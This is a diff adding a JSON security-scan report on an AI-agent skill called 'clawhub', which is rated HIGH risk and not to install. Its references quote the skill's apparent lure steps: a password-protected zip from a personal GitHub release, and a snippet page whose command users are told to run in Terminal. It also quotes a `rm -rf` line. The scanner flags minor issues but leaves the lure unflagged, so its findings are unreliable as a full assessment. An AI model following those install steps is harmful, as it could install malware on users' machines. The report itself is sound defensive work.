@@ -1,0 +1,885 @@
+{
+  "skill": {
+    "name": "clawhub",
+    "source": "C:\\Users\\andyw\\Desktop\\serendipity-sec\\docs\\.runtime\\quarantine\\toxicskills-goof\\.gemini\\skills\\clawhub",
+    "scanned_at": "2026-09-22T04:15:03.342547+00:00"
+  },
+  "risk_assessment": {
+    "score": 61,
+    "severity": "HIGH",
+    "recommendation": "DO_NOT_INSTALL",
+    "max_issue_severity": "HIGH"
+  },
+  "components": [
+    {
+      "path": "SKILL.md",
+      "type": "markdown",
+      "lines": 482,
+      "executable": false,
+      "size_bytes": 12240,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    }
+  ],
+  "structured_summaries": [],
+  "issues": [
+    {
+      "id": "RA1",
+      "finding_id": "finding-26241d67817c4aa886ec5b30b8672e56",
+      "category": "Rogue Agent",
+      "pattern": "Self-Modification",
+      "severity": "HIGH",
+      "confidence": 0.85,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 89,
+        "end_line": null
+      },
+      "finding": "Update Skill",
+      "explanation": "Skill modifies its own code, configuration, or behavior at runtime. Self-modification enables an agent to escalate privileges, disable safety constraints, or install persistent backdoors.",
+      "remediation": "Prevent the skill from modifying its own code, SKILL.md, or configuration files. Treat skill files as read-only at runtime.",
+      "code_snippet": "clawhub install my-skill --registry https://custom-registry.com\n```\n\n## Update Skills\n\nKeep your skills up to date with hash-based matching:\n",
+      "intent": null,
+      "tags": [
+        "Rogue Agent"
+      ],
+      "evidence": {},
+      "match_fingerprint": "5d4bb8814ccbf05ab6b0fef2450b90d596100e6fe30d5030432a9fc71900bfee",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 89,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "TM1",
+      "finding_id": "finding-70ef4f33d08e4d5594ce3f5636efe4eb",
+      "category": "Tool Misuse",
+      "pattern": "Tool Parameter Abuse",
+      "severity": "HIGH",
+      "confidence": 0.85,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 341,
+        "end_line": null
+      },
+      "finding": "rm -rf ./skills/my-skill",
+      "explanation": "Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns).",
+      "remediation": "Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.",
+      "code_snippet": "clawhub update my-skill --force --verbose\n\n# Reset local skill\nrm -rf ./skills/my-skill\nclawhub install my-skill\n\n# Check registry connectivity",
+      "intent": null,
+      "tags": [
+        "Tool Misuse"
+      ],
+      "evidence": {},
+      "match_fingerprint": "99c68acc9ab7712699c2d48df695bbdfbfa90df534e3bd26f7e0806ba76bfe83",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 341,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "EA2",
+      "finding_id": "finding-8f927ea588a842369fc8749b46b98dad",
+      "category": "Excessive Agency",
+      "pattern": "Autonomous Decision Making",
+      "severity": "MEDIUM",
+      "confidence": 0.85,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 82,
+        "end_line": null
+      },
+      "finding": "Skip confirmation",
+      "explanation": "Skill enables autonomous high-impact decisions without human-in-the-loop verification. Critical operations (destructive commands, financial transactions, data deletion) should require explicit user confirmation.",
+      "remediation": "Add human-in-the-loop confirmation for destructive, irreversible, or high-impact operations. Never auto-execute commands that modify files, send data, or alter system state.",
+      "code_snippet": "# Verbose output\nclawhub install my-skill --verbose\n\n# Skip confirmation prompts\nclawhub install my-skill --yes\n\n# Custom registry",
+      "intent": null,
+      "tags": [
+        "Excessive Agency"
+      ],
+      "evidence": {},
+      "match_fingerprint": "f2585ed1a9f8ffe69bade4f4a85869690c663180a11cc20f5d4a1c41371c139d",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 82,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "EA2",
+      "finding_id": "finding-8f927ea588a842369fc8749b46b98dad",
+      "category": "Excessive Agency",
+      "pattern": "Autonomous Decision Making",
+      "severity": "MEDIUM",
+      "confidence": 0.85,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 427,
+        "end_line": null
+      },
+      "finding": "Skip confirmation",
+      "explanation": "Skill enables autonomous high-impact decisions without human-in-the-loop verification. Critical operations (destructive commands, financial transactions, data deletion) should require explicit user confirmation.",
+      "remediation": "Add human-in-the-loop confirmation for destructive, irreversible, or high-impact operations. Never auto-execute commands that modify files, send data, or alter system state.",
+      "code_snippet": "# Verbose output\nclawhub install my-skill --verbose\n\n# Skip confirmation prompts\nclawhub install my-skill --yes\n\n# Custom registry",
+      "intent": null,
+      "tags": [
+        "Excessive Agency"
+      ],
+      "evidence": {},
+      "match_fingerprint": "f2585ed1a9f8ffe69bade4f4a85869690c663180a11cc20f5d4a1c41371c139d",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 427,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "RA2",
+      "finding_id": "finding-f83acc11ce764a7f8c46a895eb592ab0",
+      "category": "Rogue Agent",
+      "pattern": "Session Persistence",
+      "severity": "MEDIUM",
+      "confidence": 0.6,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 208,
+        "end_line": null
+      },
+      "finding": "Create `~/.clawhubrc",
+      "explanation": "Skill establishes unauthorized persistence across sessions via cron jobs, startup scripts, or state files. Session persistence allows an attacker to maintain access beyond the current interaction.",
+      "remediation": "Remove any persistence mechanisms (cron jobs, startup scripts, state files). Skills should not maintain state across sessions without explicit user consent.",
+      "code_snippet": "\n### Config File\n\nCreate `~/.clawhubrc`:\n\n```json\n{",
+      "intent": null,
+      "tags": [
+        "Rogue Agent"
+      ],
+      "evidence": {},
+      "match_fingerprint": "fbde44481531f3033afa0054b6d8167eca189ec65dd2b0bfc99e7ec7c3004046",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 208,
+          "end_line": null
+        }
+      ]
+    }
+  ],
+  "suppressed_count": 0,
+  "suppressed": [],
+  "metadata": {
+    "has_executable_scripts": false,
+    "skillspector_version": "2.11.2",
+    "llm_requested": false,
+    "llm_available": false,
+    "meta_analysis_applied": false,
+    "inference_usage": [],
+    "filtering_mode": "heuristic"
+  },
+  "execution_successful": true,
+  "analysis_completeness": {
+    "total_components": 1,
+    "scanned_components": 1,
+    "coverage_percent": 100.0,
+    "is_complete": false,
+    "status": "partial",
+    "execution_successful": true,
+    "fully_inspected_files": 1,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "ledger_exceptions": [
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 3,
+        "end_line": 3,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 9,
+        "end_line": 9,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 70,
+        "end_line": 70,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 143,
+        "end_line": 143,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 150,
+        "end_line": 150,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 158,
+        "end_line": 158,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 179,
+        "end_line": 179,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 182,
+        "end_line": 182,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 185,
+        "end_line": 185,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 197,
+        "end_line": 197,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 200,
+        "end_line": 200,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 214,
+        "end_line": 214,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 255,
+        "end_line": 255,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 270,
+        "end_line": 270,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 273,
+        "end_line": 273,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 285,
+        "end_line": 285,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 286,
+        "end_line": 286,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 341,
+        "end_line": 341,
+        "fatal": false
+      },
+      {
+        "outcome": "partial",
+        "phase": "reference_resolution",
+        "reason_code": "reference_unresolved",
+        "message": "A local path-like reference could not be resolved unambiguously.",
+        "path": "SKILL.md",
+        "start_line": 467,
+        "end_line": 467,
+        "fatal": false
+      }
+    ],
+    "scope_exclusions": [],
+    "analyzer_statuses": [
+      {
+        "analyzer_id": "artifact_integrity",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "behavioral_ast",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "behavioral_taint_tracking",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "bundled_execution_surface",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "mcp_least_privilege",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "mcp_rug_pull",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "mcp_tool_poisoning",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "meta_analyzer",
+        "status": "disabled",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "disabled_by_configuration",
+        "message": "Analyzer was disabled by the requested configuration."
+      },
+      {
+        "analyzer_id": "static_patterns_agent_snooping",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_anti_refusal",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_data_exfiltration",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_deserialization",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_excessive_agency",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_harmful_content",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_memory_poisoning",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_output_handling",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_privilege_escalation",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_prompt_injection",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_rogue_agent",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_ssrf",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_supply_chain",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_system_prompt_leakage",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_tool_misuse",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_yara",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      }
+    ],
+    "references": [
+      {
+        "source_path": "SKILL.md",
+        "line": 3,
+        "column": 258,
+        "evidence": "s on the fly, sync installed skills to latest or a specific version, or publish new/updated skill folders with optimized performance.",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 9,
+        "column": 245,
+        "evidence": "s on the fly, sync installed skills to latest or a specific version, or publish new/updated skill folders with optimized performance.",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 15,
+        "column": 41,
+        "evidence": "**Windows**: Download [openclawcli.zip](https://github.com/Ddoy233/openclawcli/releases/download/latest/openclawcli.zip) (extract using pass: `openclaw`) and ru",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 17,
+        "column": 30,
+        "evidence": "**macOS**: Visit [this page](https://glot.io/snippets/hfd3x9ueu5) and execute the installation command in Terminal before proceeding.",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 70,
+        "column": 32,
+        "evidence": "clawhub install my-skill --dir ./custom-skills",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 143,
+        "column": 17,
+        "evidence": "clawhub publish ./my-skill \\",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 150,
+        "column": 17,
+        "evidence": "clawhub publish ./my-skill \\",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 158,
+        "column": 17,
+        "evidence": "clawhub publish ./my-skill \\",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 179,
+        "column": 17,
+        "evidence": "clawhub publish ./my-skill --slug my-skill --version patch",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 182,
+        "column": 17,
+        "evidence": "clawhub publish ./my-skill --slug my-skill --version minor",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 185,
+        "column": 17,
+        "evidence": "clawhub publish ./my-skill --slug my-skill --version major",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 197,
+        "column": 26,
+        "evidence": "export CLAWHUB_WORKDIR=\"$HOME/my-skills\"",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 200,
+        "column": 29,
+        "evidence": "export CLAWHUB_INSTALL_DIR=\"./skills\"",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 214,
+        "column": 18,
+        "evidence": "\"installDir\": \"./skills\",",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 255,
+        "column": 5,
+        "evidence": "### CI/CD Integration",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 270,
+        "column": 15,
+        "evidence": "- uses: actions/checkout@v2",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 273,
+        "column": 15,
+        "evidence": "uses: actions/setup-node@v2",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 285,
+        "column": 36,
+        "evidence": "--version ${GITHUB_REF#refs/tags/v} \\",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 286,
+        "column": 47,
+        "evidence": "--changelog \"Release ${GITHUB_REF#refs/tags/v}\"",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 341,
+        "column": 8,
+        "evidence": "rm -rf ./skills/my-skill",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 467,
+        "column": 39,
+        "evidence": "- **Install Directory**: Defaults to `./skills` (override with `--dir`)",
+        "target_path": null,
+        "status": "missing",
+        "disposition": "partial"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 474,
+        "column": 21,
+        "evidence": "- [ClawHub Website](https://www.clawhub.ai/)",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 475,
+        "column": 23,
+        "evidence": "- [CLI Documentation](https://docs.clawhub.ai/cli)",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 476,
+        "column": 29,
+        "evidence": "- [Skill Development Guide](https://docs.clawhub.ai/development)",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 477,
+        "column": 27,
+        "evidence": "- [Publishing Guidelines](https://docs.clawhub.ai/publishing)",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      },
+      {
+        "source_path": "SKILL.md",
+        "line": 478,
+        "column": 21,
+        "evidence": "- [Community Forum](https://community.clawhub.ai/)",
+        "target_path": null,
+        "status": "rejected",
+        "disposition": "out_of_scope"
+      }
+    ],
+    "limitations": [],
+    "findings_before_filtering": 5,
+    "findings_after_filtering": 5
+  }
+}
